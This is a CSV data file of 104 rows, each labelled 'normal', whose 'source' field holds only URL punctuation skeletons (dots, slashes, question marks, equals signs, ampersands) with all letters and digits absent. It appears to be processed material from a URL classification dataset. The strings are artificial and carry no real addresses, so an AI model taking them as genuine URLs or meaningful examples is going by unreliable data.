,language,source
1,normal,". . . . / / / / ? = & = & = "
2,normal,". . / / / ? = "
3,normal,". . . . / / "
4,normal,". . / / "
5,normal,". . . / ? = & = & = "
6,normal,". . . . / / / "
7,normal,". . . . / / / / ? = & = "
8,normal,". . . / "
9,normal,". . / ? = "
10,normal,". . / ? = & = & = "
11,normal,". . / / ? = & = "
12,normal,". . . . / / / ? = "
13,normal,". . / "
14,normal,". . / / ? = & = & = "
15,normal,". . . . / "
16,normal,". . . / / / / ? = "
17,normal,". . . ? = & = "
18,normal,". "
19,normal,". . . . ? = & = & = "
20,normal,". . . . ? = & = & = "
21,normal,". . ? = & = "
22,normal,". . . . / / / "
23,normal,". . . / / / ? = & = & = "
24,normal,". . / / / / ? = & = & = "
25,normal,". . / / / / ? = & = "
26,normal,". . . / / ? = & = "
27,normal,". . . / / "
28,normal,". . "
29,normal,". "
30,normal,". . . / / / / ? = & = & = "
31,normal,". . . / / ? = & = & = "
32,normal,". "
33,normal,". . . / / ? = & = & = "
34,normal,". . . / / / ? = & = & = "
35,normal,". . . . / / ? = "
36,normal,". . "
37,normal,". . . / ? = & = & = "
38,normal,". . . / ? = & = "
39,normal,". . . . / / / / ? = & = "
40,normal,". . . . ? = "
41,normal,". . . / / ? = & = & = "
42,normal,". . ? = & = "
43,normal,". . . / / / ? = "
44,normal,". . . / / / / ? = "
45,normal,". . / "
46,normal,". . . . / / ? = & = & = "
47,normal,". . . / / ? = "
48,normal,". . . / / ? = & = & = "
49,normal,". . / / ? = & = & = "
50,normal,". . . ? = & = & = "
51,normal,". . / ? = & = & = "
52,normal,". . . . / / / ? = & = & = "
53,normal,". . . / / ? = "
54,normal,". . . . / / / ? = & = & = "
55,normal,". . . . / / / / ? = "
56,normal,". . . . / ? = "
57,normal,". . . / / / / ? = "
58,normal,". . . . / / "
59,normal,". . . . "
60,normal,". . . . / ? = & = & = "
61,normal,". . . . / / / ? = & = & = "
62,normal,". . . . / / / ? = & = & = "
63,normal,". . . . "
64,normal,". . . . / "
65,normal,". . . . / / "
66,normal,". . . . / / / ? = & = & = "
67,normal,". . . . / / / ? = "
68,normal,". . / ? = "
69,normal,". . . / ? = & = & = "
70,normal,". . . . / / ? = "
71,normal,". . . ? = & = & = "
72,normal,". . / / / "
73,normal,". . . . / / ? = & = & = "
74,normal,". . ? = & = "
75,normal,". . . / / / ? = & = & = "
76,normal,". . / ? = "
77,normal,". . . . / "
78,normal,". . . / / ? = & = "
79,normal,". . ? = & = & = "
80,normal,". . . / / ? = & = "
81,normal,". . . ? = "
82,normal,". . / / "
83,normal,". . / ? = "
84,normal,". . . . / ? = & = "
85,normal,". . / / / / ? = "
86,normal,". . . . / ? = "
87,normal,". . . ? = & = "
88,normal,". . . / / / ? = & = "
89,normal,". . . / / "
90,normal,". . / / / / ? = "
91,normal,". . / / / / ? = & = "
92,normal,". . . ? = "
93,normal,". . / / / ? = "
94,normal,". . . . "
95,normal,". . . . / / "
96,normal,". . . / / / ? = & = & = "
97,normal,". . / / ? = "
98,normal,". . / "
99,normal,". . . . / ? = & = & = "
100,normal,". . . / ? = & = "
101,normal,". . . . / / / "
102,normal,". . "
103,normal,". . "
104,normal,". . . / / ? = & = & = "
